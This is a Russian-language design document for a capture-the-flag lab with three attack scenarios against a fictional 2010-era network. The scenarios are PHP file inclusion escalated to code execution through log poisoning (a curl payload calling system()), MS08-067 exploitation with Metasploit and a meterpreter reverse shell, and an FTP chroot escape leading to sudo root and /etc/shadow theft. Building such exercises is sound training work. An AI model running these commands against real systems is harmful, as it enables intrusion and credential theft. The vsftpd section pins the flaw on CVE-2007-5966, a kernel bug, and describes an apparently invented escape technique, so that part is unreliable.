
### Общая ИТ инфраструктура для всех сценариев

**Описание хостов:**
*   **Router/GW:** `gateway.ctf2010.local`
    *   Debian Linux 5.0 (Lenny) или CentOS 5
    *   iptables, выполняет роль NAT и простого файрвола.
    *   Имеет два интерфейса во внутренних сетях.
*   **Web-Srv:** `webserver.ctf2010.local`
    *   Ubuntu Server 10.04 LTS / Debian 6 (Squeeze)
    *   Веб-сервер: Apache 2.2 + PHP 5.3.x, maybe mod_ssl.
    *   Возможно, запущен какой-то самописный сервис на C/Python.
*   **Client:** `client-pc.ctf2010.local`
    *   Windows XP SP3 / Windows 7
    *   Старая версия браузера (Firefox 3.6, IE8).
    *   Может быть установлен какой-то клиентский софт (FTP-клиент, Telnet).
*   **Internal-Server:** `internal.ctf2010.local`
    *   CentOS 5 / FreeBSD 8
    *   Запущены внутренние сервисы: FTP-сервер (vsftpd/proftpd), Samba, maybe SSH на нестандартном порту.
    *   Здесь хранятся флаги для более сложных заданий.

---

### Вариант 1: Атака на веб-сервер (LFI -> RCE)

**Цель:** Получить shell на машине `webserver.ctf2010.local` и найти файл `flag.txt` в домашней директории пользователя `www-data`.

**Инфраструктура:**
*   **Хост:** `webserver.ctf2010.local` (Linux)
*   **Сервис:** Apache 2.2 + PHP 5.3.х
*   **Веб-приложение:** Простой сайт на PHP с навигацией вида `index.php?page=about.html`.

**Уязвимость:**
*   **Local File Inclusion (LFI):** Скрипт `index.php` использует параметр `page` для включения контента без должной санитализации.
    *   Исходный код: `<?php include($_GET['page']); ?>`
*   **Уязвимая конфигурация PHP:** `register_globals = On` (очень распространено в то время) и `allow_url_include = Off` (по умолчанию).

**Шаги атаки:**
1.  **Разведка:** Сканирование портов (nmap) показывает открытый 80-й порт (Apache).
2.  **Обнаружение уязвимости:**
    *   Проверка: `http://webserver.ctf2010.local/index.php?page=../../../../etc/passwd`
    *   Если в ответе видно содержимое `/etc/passwd` — уязвимость подтверждена.
3.  **Эскалация до RCE (Remote Code Execution):**
    *   **Метод 1: Через логи Apache.** Атакующий заставляет сервер записать PHP-код в логи (например, в `access.log`) через User-Agent или параметр в URL, а затем включает этот лог-файл через LFI.
        *   `curl -A "<?php system(\$_GET['cmd']); ?>" http://webserver.ctf2010.local/`
        *   `http://webserver.ctf2010.local/index.php?page=../../../../var/log/apache2/access.log&cmd=id`
    *   **Метод 2: Через `/proc/self/environ`.** Если атакующий может контролировать переменные окружения (например, через User-Agent), он может записать код в переменную, а затем включить файл `/proc/self/environ` через LFI.
4.  **Выполнение команд:** После успешной атаки атакующий получает возможность выполнять команды: `&cmd=whoami`, `&cmd=cat /home/www-data/flag.txt`.

**Задание для игрока:**
"Обнаружьте уязвимость в веб-приложении на основном сайте. Используйте её для получения доступа к командной оболочке сервера и найдите флаг."

---

### Вариант 2: Атака на Windows-клиент (SMB + Buffer Overflow)

**Цель:** Получить контроль над машиной `client-pc.ctf2010.local` и найти файл `flag.txt` на рабочем столе пользователя.

**Инфраструктура:**
*   **Хост:** `client-pc.ctf2010.local` (Windows XP SP2/SP3)
*   **Сервисы:** Сетевой сосед (SMB), возможно, запущен уязвимый софт (мессенджер, FTP-клиент).
*   **Важно:** На машине не установлены критические обновления (MS08-067).

**Уязвимость:**
*   **MS08-067 (CVE-2008-4250):** Критическая уязвимость в сервисе Server Service, позволяющая выполнить удалённый код без аутентификации. Это была "бомба" того периода.

**Шаги атаки:**
1.  **Разведка:** Сканирование сети (nmap) показывает, что на `10.0.1.20` (Windows-клиент) открыт порт 445 (SMB).
2.  **Подтверждение уязвимости:** Использование сканера уязвимостей (например, `nessus` или скрипта для `metasploit`) для проверки на наличие MS08-067.
3.  **Эксплуатация:**
    *   Запуск `metasploit` (актуальная на тот момент версия 3.x).
    *   Выбор эксплоита: `use exploit/windows/smb/ms08_067_netapi`
    *   Установка параметров: `set RHOST 10.0.1.20`, `set PAYLOAD windows/meterpreter/reverse_tcp`
    *   Запуск: `exploit`
4.  **Получение доступа:** В случае успеха `metasploit` откроет интерактивную сессию `meterpreter` на атакованной машине.
5.  **Поиск флага:** В сессии `meterpreter` выполнить команды для навигации по файловой системе и чтения флага: `shell` -> `dir C:\Documents and Settings\User\Desktop\flag.txt /s`.

**Задание для игрока:**
"В корпоративной сети находится компьютер сотрудника. Получите на нём контроль, воспользовавшись известной уязвимостью операционной системы, и найдите конфиденциальный файл."

---

### Вариант 3: Атака на внутренний сервис (FTP + Privilege Escalation)

Более сложная двухэтапная атака, требующая сканирования и эскалации привилегий.

**Цель:** Получить root-доступ на машине `internal.ctf2010.local` и прочитать файл `/root/flag.txt`.

**Инфраструктура:**
*   **Хост:** `internal.ctf2010.local` (Linux, например, CentOS 5)
*   **Сервисы:** vsftpd 2.0.5 (уязвимая версия), SSH на порту 2222.

**Уязвимости:**
1.  **CVE-2007-5966:** Уязвимость в chroot-механизме vsftpd 2.0.5, позволяющая получить доступ к корневой файловой системе (выход из chroot'а).
2.  **Небезопасная конфигурация sudo:** Пользователь `ftpadmin` может выполнять от root любую команду без пароля (`NOPASSWD: ALL` в `/etc/sudoers`).

**Шаги атаки:**
1.  **Разведка:** Сканирование портов машины `internal.ctf2010.local` показывает открытые порты: 21 (FTP), 2222 (SSH).
2.  **Атака на FTP:**
    *   Установка соединения: `ftp 10.0.2.30`
    *   Логин: anonymous (разрешён) или подбор простых учётных данных (admin:admin).
    *   **Эксплуатация уязвимости vsftpd:** Используется техника `CWD .../.../.../.../.../.../.../.../.../.../` для выхода из chroot-окружения. Это позволяет увидеть настоящую корневую файловую систему.
    *   Атакующий может скачать критически важные файлы: `/etc/passwd`, `/etc/shadow` (если есть права), `/etc/sudoers`.
3.  **Анализ и эскалация привилегий:**
    *   В файле `/etc/passwd` обнаруживается пользователь `ftpadmin`.
    *   Скачав и проанализировав `/etc/sudoers`, атакующий видит строку: `ftpadmin ALL=(ALL) NOPASSWD: ALL`
    *   Это означает, что войдя как `ftpadmin`, можно стать root через `sudo su`.
4.  **Доступ по SSH:**
    *   Атакующий пытается подобрать/перебрать пароль для пользователя `ftpadmin` через SSH на порт 2222 (используя скачанный `shadow` или простые пароли).
    *   После входа: `sudo su -`, получает root-доступ.
    *   `cat /root/flag.txt`

**Задание для игрока:**
"Обойдите ограничения FTP-сервера, чтобы получить доступ к системным файлам. Проанализируйте их, чтобы найти способ получить полный контроль над системой."

---
